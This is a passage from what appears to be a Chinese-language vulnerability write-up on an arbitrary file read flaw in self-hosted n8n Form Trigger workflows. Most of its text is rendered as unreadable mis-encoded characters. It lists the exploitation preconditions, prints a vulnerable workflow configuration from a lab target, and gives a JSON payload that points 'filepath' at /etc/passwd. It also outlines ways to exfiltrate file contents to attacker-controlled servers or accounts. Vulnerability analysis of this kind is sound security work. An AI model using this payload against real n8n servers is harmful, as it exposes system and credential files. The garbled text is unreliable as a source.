leaf="">è¡¨å•å·¥ä½œæµå­˜åœ¨</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">ç›®æ ‡å¿…é¡»é…ç½®äº†å¸¦æœ‰æ–‡ä»¶ä¸Šä¼ å­—æ®µçš„ Form Trigger å·¥ä½œæµ</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">è®¿é—® n8n UI æˆ–é€šè¿‡ API æŸ¥è¯¢å·¥ä½œæµ</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2ï¸âƒ£</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">æœ‰å“åº”èŠ‚ç‚¹</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">å·¥ä½œæµå¿…é¡»åŒ…å« &#34;Respond to Webhook&#34; èŠ‚ç‚¹æ¥è¿”å›æ–‡ä»¶å†…å®¹</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">æŸ¥çœ‹å·¥ä½œæµé…ç½®ä¸­çš„èŠ‚ç‚¹è¿æ¥</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">3ï¸âƒ£</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">å·¥ä½œæµå·²æ¿€æ´»</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">å·¥ä½œæµå¿…é¡»å¤„äºæ¿€æ´»çŠ¶æ€ï¼ˆè€Œä¸æ˜¯è‰ç¨¿/åœç”¨ï¼‰</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">å·¥ä½œæµå³ä¸Šè§’å¼€å…³ä¸ºå¼€å¯çŠ¶æ€</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">4ï¸âƒ£</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">æ— éœ€è®¤è¯</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">è¡¨å•å¿…é¡»å…è®¸å…¬å¼€è®¿é—®ï¼Œä¸éœ€è¦ç™»å½•</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">ç›´æ¥è®¿é—®è¡¨å• URL å¦‚ http://IP:5678/form/vulnerable-form ä¸ä¼šé‡å®šå‘åˆ°ç™»å½•é¡µ</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">5ï¸âƒ£</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">è¿”å›äºŒè¿›åˆ¶æ•°æ®</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Respond èŠ‚ç‚¹é…ç½®ä¸ºè¿”å› binary ç±»å‹æ•°æ®</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: #d14;background: rgba(27,31,35,.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">respondWith: &#34;binary&#34;</span></code></td></tr></tbody></table>  
## ğŸ¯ æ˜“å—æ”»å‡»çš„å·¥ä½œæµç¤ºä¾‹  
### å…¸å‹çš„æ¼æ´é…ç½®  
```
{Â  "nodes":Â [Â  Â  {Â  Â  Â  "name":Â "Form Trigger",Â  Â  Â  "type":Â "n8n-nodes-base.formTrigger",Â  Â  Â  "parameters":Â {Â  Â  Â  Â  "responseMode":Â "responseNode",Â  // â† å…³é”®ï¼šä½¿ç”¨å“åº”èŠ‚ç‚¹æ¨¡å¼Â  Â  Â  Â  "formFields":Â {Â  Â  Â  Â  Â  "values":Â [Â  Â  Â  Â  Â  Â  {Â  Â  Â  Â  Â  Â  Â  "fieldLabel":Â "document",Â  Â  Â  Â  Â  Â  Â  "fieldType":Â "file"Â  // â† å…³é”®ï¼šæ–‡ä»¶ç±»å‹å­—æ®µÂ  Â  Â  Â  Â  Â  }Â  Â  Â  Â  Â  ]Â  Â  Â  Â  }Â  Â  Â  }Â  Â  },Â  Â  {Â  Â  Â  "name":Â "Respond",Â  Â  Â  "type":Â "n8n-nodes-base.respondToWebhook",Â  Â  Â  "parameters":Â {Â  Â  Â  Â  "respondWith":Â "binary",Â  // â† å…³é”®ï¼šè¿”å›äºŒè¿›åˆ¶æ•°æ®Â  Â  Â  Â  "inputDataFieldName":Â "document"Â  Â  Â  }Â  Â  }Â  ],Â  "connections":Â {Â  Â  "Form Trigger":Â {Â  Â  Â  "main":Â [[{"node":Â "Respond"}]]Â  // â† å…³é”®ï¼šä¸¤ä¸ªèŠ‚ç‚¹å¿…é¡»è¿æ¥Â  Â  }Â  }}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibWeylqTSbWVEsmQ0ia1d54BpNsLb7wZ7P8gtQPANvSdEfwUQp9SPtVTZO2eqypOcLUtI3PGFwcSVPA/640?wx_fmt=png&from=appmsg "null")  
  
  
ä¸‹è½½é¶æœºçš„å·¥ä½œæµç¨‹é…ç½®ç¡®å®å¦‚æ­¤ã€‚  
```
{Â  "name":Â "Vulnerable Form",Â  "nodes":Â [Â  Â  {Â  Â  Â  "parameters":Â {Â  Â  Â  Â  "formTitle":Â "Upload",Â  Â  Â  Â  "formFields":Â {Â  Â  Â  Â  Â  "values":Â [Â  Â  Â  Â  Â  Â  {Â  Â  Â  Â  Â  Â  Â  "fieldLabel":Â "document",Â  Â  Â  Â  Â  Â  Â  "fieldType":Â "file"Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  Â  ]Â  Â  Â  Â  },Â  Â  Â  Â  "responseMode":Â "responseNode",Â  Â  Â  Â  "options":Â {}Â  Â  Â  },Â  Â  Â  "id":Â "trigger",Â  Â  Â  "name":Â "Form Trigger",Â  Â  Â  "type":Â "n8n-nodes-base.formTrigger",Â  Â  Â  "typeVersion":Â 2.2,Â  Â  Â  "position":Â [Â  Â  Â  Â  0,Â  Â  Â  Â  0Â  Â  Â  ],Â  Â  Â  "webhookId":Â "vulnerable-form"Â  Â  },Â  Â  {Â  Â  Â  "parameters":Â {Â  Â  Â  Â  "respondWith":Â "binary",Â  Â  Â  Â  "options":Â {}Â  Â  Â  },Â  Â  Â  "id":Â "respond",Â  Â  Â  "name":Â "Respond",Â  Â  Â  "type":Â "n8n-nodes-base.respondToWebhook",Â  Â  Â  "typeVersion":Â 1.1,Â  Â  Â  "position":Â [Â  Â  Â  Â  300,Â  Â  Â  Â  0Â  Â  Â  ]Â  Â  }Â  ],Â  "pinData":Â {},Â  "connections":Â {Â  Â  "Form Trigger":Â {Â  Â  Â  "main":Â [Â  Â  Â  Â  [Â  Â  Â  Â  Â  {Â  Â  Â  Â  Â  Â  "node":Â "Respond",Â  Â  Â  Â  Â  Â  "type":Â "main",Â  Â  Â  Â  Â  Â  "index":Â 0Â  Â  Â  Â  Â  }Â  Â  Â  Â  ]Â  Â  Â  ]Â  Â  }Â  },Â  "active":Â true,Â  "settings":Â {Â  Â  "executionOrder":Â "v1"Â  },Â  "versionId":Â "113cf64e-837c-44aa-83f3-5244ee446eac",Â  "meta":Â {Â  Â  "templateCredsSetupCompleted":Â true,Â  Â  "instanceId":Â "3f11b0ad0c3ab511dade954f94dc424506d153073749fdfee9eaf02b3c813448"Â  },Â  "id":Â "Tjg3GOuwAWx89qE2",Â  "tags":Â []}
```  
### ğŸ”‘ æ¼æ´è§¦å‘çš„å…³é”®è¦ç´   
1. 1.Â **fieldType: "file"**  
Â - å…è®¸æ–‡ä»¶ä¸Šä¼   
  
1. 2.Â **respondWith: "binary"**  
Â - ä»¥äºŒè¿›åˆ¶å½¢å¼è¿”å›æ–‡ä»¶å†…å®¹  
  
1. 3.Â **èŠ‚ç‚¹è¿æ¥**  
Â - Form Trigger â†’ Respond to Webhook  
  
1. 4.Â **responseMode: "responseNode"**  
Â - ä½¿ç”¨å“åº”èŠ‚ç‚¹è€Œä¸æ˜¯è‡ªåŠ¨å“åº”  
  
## âœ… é€‚ç”¨åœºæ™¯ï¼ˆå¯ä»¥åˆ©ç”¨ï¼‰  
### 1. æ–‡ä»¶å¤„ç†å·¥ä½œæµ  
- â€¢ âœ… PDF è½¬æ¢å™¨  
  
- â€¢ âœ… å›¾ç‰‡å‹ç¼©/è°ƒæ•´å¤§å°  
  
- â€¢ âœ… æ–‡æ¡£æ ¼å¼è½¬æ¢å™¨  
  
- â€¢ âœ… æ–‡ä»¶é¢„è§ˆæœåŠ¡  
  
**ç‰¹ç‚¹**  
: ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ â†’ å¤„ç† â†’ è¿”å›å¤„ç†åçš„æ–‡ä»¶  
### 2. é»˜è®¤ n8n å®‰è£…  
- â€¢ âœ… è¡¨è¾¾å¼æ³¨å…¥ï¼ˆCVE-2025-68613ï¼‰æœªè¢«ç¦ç”¨  
  
- â€¢ âœ… æœ¬åœ°éƒ¨ç½²æˆ– Docker éƒ¨ç½²  
  
- â€¢ âœ… é…ç½®å’Œæ•°æ®åº“å­˜å‚¨åœ¨æœ¬åœ°ç£ç›˜  
  
### 3. å…¬å¼€è®¿é—®çš„è¡¨å•  
- â€¢ âœ… æ— éœ€ç™»å½•å³å¯è®¿é—®  
  
- â€¢ âœ… æ— éœ€ API å¯†é’¥æˆ– Token  
  
- â€¢ âœ… ç›´æ¥é€šè¿‡ URL å¯è®¿é—®  
  
## âŒ ä¸é€‚ç”¨åœºæ™¯ï¼ˆæ— æ³•åˆ©ç”¨ï¼‰  
### 1. æ²¡æœ‰å“åº”èŠ‚ç‚¹çš„è¡¨å•  
```
Form Trigger â†’ [å…¶ä»–å¤„ç†èŠ‚ç‚¹] â†’ ä¿å­˜åˆ°æ•°æ®åº“/å‘é€é‚®ä»¶
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â†‘
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  æ²¡æœ‰ Respond èŠ‚ç‚¹
```  
  
**ç»“æœ**  
: æ–‡ä»¶è¢«è¯»å–ä½†å†…å®¹æ— æ³•é€šè¿‡ HTTP å“åº”è·å–  
### 2. éœ€è¦è®¤è¯çš„è¡¨å•  
```
è®¿é—®è¡¨å• â†’ è¦æ±‚ç™»å½• â†’ æ— æ³•æäº¤æ¶æ„ payload
```  
  
**ç»“æœ**  
: æ— æ³•è§¦å‘æ¼æ´  
### 3. n8n Cloudï¼ˆäº‘ç«¯æ‰˜ç®¡ï¼‰  
- â€¢ âŒ ä¸åŒçš„æ¶æ„è®¾è®¡  
  
- â€¢ âŒ æ— æ³•ç›´æ¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ  
  
- â€¢ âŒ æ•°æ®åº“ä¸åœ¨å¯è¯»å–çš„è·¯å¾„  
  
### 4. å·²ä¿®å¤ç‰ˆæœ¬  
- â€¢ âŒ n8n >= 1.121.0ï¼ˆä»»æ„æ–‡ä»¶è¯»å–å·²ä¿®å¤ï¼‰  
  
- â€¢ âŒ n8n >= 1.120.4ï¼ˆè¡¨è¾¾å¼æ³¨å…¥å·²ä¿®å¤ï¼‰  
  
## ğŸ” æ¼æ´åŸç†æ·±åº¦è§£æ  
### æ¼æ´è§¦å‘æµç¨‹  
```
1. æ”»å‡»è€…å‘é€æ¶æ„ JSON payload:
Â  Â {
Â  Â  Â "files": {
Â  Â  Â  Â "test": {
Â  Â  Â  Â  Â "filepath": "/etc/passwd", Â // â† æ§åˆ¶æ–‡ä»¶è·¯å¾„
Â  Â  Â  Â  Â "originalFilename": "test.txt",
Â  Â  Â  Â  Â "mimetype": "text/plain"
Â  Â  Â  Â }
Â  Â  Â }
Â  Â }

2. n8n é”™è¯¯å¤„ç†:
Â  Â - æ¥å— Content-Type: application/jsonï¼ˆåº”è¯¥åªæ¥å— multipart/form-dataï¼‰
Â  Â - ç›´æ¥ä½¿ç”¨ç”¨æˆ·æä¾›çš„ filepath
Â  Â - æ²¡æœ‰è·¯å¾„éªŒè¯æˆ–æ²™ç®±é™åˆ¶

3. æ–‡ä»¶è¯»å–:
Â  Â - n8n è¯»å–æ”»å‡»è€…æŒ‡å®šçš„ä»»æ„æ–‡ä»¶
Â  Â - å°†å†…å®¹ä¼ é€’ç»™ Respond èŠ‚ç‚¹

4. æ•°æ®æ³„éœ²:
Â  Â - Respond èŠ‚ç‚¹é…ç½®ä¸º respondWith: "binary"
Â  Â - æ–‡ä»¶å†…å®¹ç›´æ¥åœ¨ HTTP å“åº”ä¸­è¿”å›ç»™æ”»å‡»è€…
```  
## ğŸ­ æ›¿ä»£åˆ©ç”¨æ–¹å¼  
  
å³ä½¿æ²¡æœ‰ "Respond to Webhook" èŠ‚ç‚¹ï¼Œæ¼æ´**ä»ç„¶å­˜åœ¨**  
ï¼Œä½†éœ€è¦ä¸åŒçš„æ•°æ®å¤–æ³„æ–¹æ³•ï¼š  
### æ–¹æ³• 1: å¸¦å¤–ï¼ˆOOBï¼‰æ•°æ®å¤–æ³„  
```
Form Trigger â†’ HTTP Request èŠ‚ç‚¹
Â  Â  Â  Â  Â  Â  Â  Â â†“
Â  Â  Â  Â  Â  Â  Â  Â å°†æ–‡ä»¶å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨
```  
### æ–¹æ³• 2: æ—¶åºæ”»å‡»ï¼ˆBlind Exploitationï¼‰  
```
è¯»å–æ–‡ä»¶ â†’ æ ¹æ®æ–‡ä»¶å¤§å°/å†…å®¹å»¶è¿Ÿå“åº”
Â  Â  Â  Â  Â â†“
Â  Â  Â  Â  Â æ”»å‡»è€…é€šè¿‡å“åº”æ—¶é—´æ¨æ–­æ–‡ä»¶å†…å®¹
```  
### æ–¹æ³• 3: å…¶ä»–è¾“å‡ºèŠ‚ç‚¹  
```
Form Trigger â†’ Email/Slack/Discord èŠ‚ç‚¹
Â  Â  Â  Â  Â  Â  Â  Â â†“
Â  Â  Â  Â  Â  Â  Â  Â å°†æ–‡ä»¶å†…å®¹å‘é€åˆ°æ”»å‡»è€…æ§åˆ¶çš„è´¦æˆ·
```  
## ğŸ“Š ç°å®ä¸–ç•Œä¸­çš„åº”ç”¨åœºæ™¯  
### å®¹æ˜“å—æ”»å‡»çš„çœŸå®ç”¨ä¾‹  
  
<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">åº”ç”¨åœºæ™¯</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">é…ç½®ç‰¹ç‚¹</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">é£é™©ç­‰çº§</span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">åœ¨çº¿æ–‡æ¡£è½¬æ¢å™¨</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">æ–‡ä»¶ä¸Šä¼  + è¿”å›è½¬æ¢ç»“æœ</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">ğŸ”´ é«˜å±</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">å›¾ç‰‡å¤„ç†æœåŠ¡</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">å›¾ç‰‡ä¸Šä¼  + è¿”å›å¤„ç†åå›¾ç‰‡</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">ğŸ”´ é«˜å±</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">æ–‡ä»¶é¢„è§ˆå·¥å…·</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">æ–‡ä»¶ä¸Šä¼  + è¿”å›é¢„è§ˆ</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">ğŸ”´ é«˜å±</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">æ•°æ®åˆ†æè¡¨å•</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CSV ä¸Šä¼  + è¿”å›åˆ†æç»“æœ</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">ğŸŸ¡ ä¸­å±</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: inherit;color: #B76E79;font-weight: bold;"><span leaf="">å†…éƒ¨å·¥å…·ï¼ˆéœ€è®¤è¯ï¼‰</span></strong></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">æ–‡ä»¶ä¸Šä¼ ä½†éœ€è¦ç™»å½•</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 15px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">ğŸŸ¢ ä½å±</span></section></td></tr></tbody></table>  
### ä¸æ˜“å—æ”»å‡»çš„é…ç½®  
  
